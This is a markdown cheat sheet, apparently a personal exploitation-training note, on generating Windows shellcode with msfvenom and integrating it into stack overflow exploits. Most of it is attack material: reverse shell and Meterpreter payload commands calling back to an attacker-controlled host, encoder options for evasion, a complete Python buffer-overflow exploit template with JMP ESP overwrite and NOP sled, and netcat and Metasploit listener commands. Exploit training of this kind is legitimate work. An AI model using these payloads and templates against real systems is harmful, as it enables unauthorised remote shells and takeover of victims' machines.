---
tags:
  - Advanced
  - Binary_Exploitation
  - Custom_Tools
  - Debugging
  - Exploitation
  - Stack_Overflow
  - WinDbg
  - Windows
---

## Shellcode Generation and Integration
resources: [msfvenom Documentation](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)

> Generate shellcode and integrate it into stack overflow exploits.

### List Available Payloads
> View all available msfvenom payloads.

```bash
msfvenom -l payloads | grep windows
```

### Generate Reverse Shell Shellcode
> Create Windows reverse shell payload.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f python -b "<BadChars>"
```

### Generate Meterpreter Shellcode
> Create staged Meterpreter payload.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f python -b "<BadChars>"
```

### Common Output Formats
> Specify shellcode format for your exploit.

```bash
-f python       # Python byte string
-f c            # C-style array
-f raw          # Raw binary
-f hex          # Hex string
-f py           # Python (alternative)
```

### Specify Encoder
> Use specific encoder for evasion or bad character avoidance.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -e x86/shikata_ga_nai -f python -b "<BadChars>"
```

### Multiple Encoding Iterations
> Apply encoder multiple times.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -e x86/shikata_ga_nai -i 3 -f python -b "<BadChars>"
```

### Common Bad Characters String
> Format for msfvenom bad character exclusion.

```bash
-b "\x00\x0a\x0d"            # NULL, LF, CR
-b "\x00\x0a\x0d\x20"        # Add space
```

### Set Exit Function
> Specify how shellcode should exit.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<Port> EXITFUNC=thread -f python -b "<BadChars>"
```

> [!tip] **EXITFUNC Options**: thread, process, seh, none

### Complete Exploit Structure
> Putting all pieces together.

```python
import socket
import struct

# Configuration
target_ip = "<TargetIP>"
target_port = <TargetPort>
offset = <Offset>
eip = struct.pack("<I", <JmpEspAddress>)

# msfvenom -p windows/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f python -b "\x00"
shellcode = b""
shellcode += b"\xfc\xe8\x82\x00\x00\x00..."  # Generated shellcode

# Build payload
buffer = b"A" * offset
buffer += eip
buffer += b"\x90" * 16      # NOP sled
buffer += shellcode

# Send exploit
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(buffer)
s.close()
```

### Start Listener
> Set up listener to catch reverse shell.

```bash
nc -nvlp <Port>
```

### Metasploit Listener
> Use multi/handler for Meterpreter payloads.

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <AttackerIP>; set LPORT <Port>; run"
```

### NOP Sled Purpose [Knowledge]
> [!info] NOPs provide landing zone for imprecise jumps:
> - **0x90**: NOP instruction (No Operation)
> - Allows shellcode to execute even if ESP is slightly off
> - Typically 8-32 bytes before shellcode

### Debugging Shellcode Execution
> Verify shellcode reaches execution.

```text
0:000> bp <JmpEspAddress>   ; Break on JMP ESP
0:000> g                    ; Run until breakpoint
0:000> t                    ; Step into shellcode
0:000> db eip L50           ; Verify shellcode bytes
```

### Shellcode Not Executing Checklist
> [!warning] Common issues when shellcode fails:
> 1. Bad characters corrupting shellcode
> 2. DEP preventing stack execution
> 3. Insufficient space for shellcode
> 4. Wrong architecture (x86 vs x64)
> 5. Encoder decoder failing (bad chars in decoder)

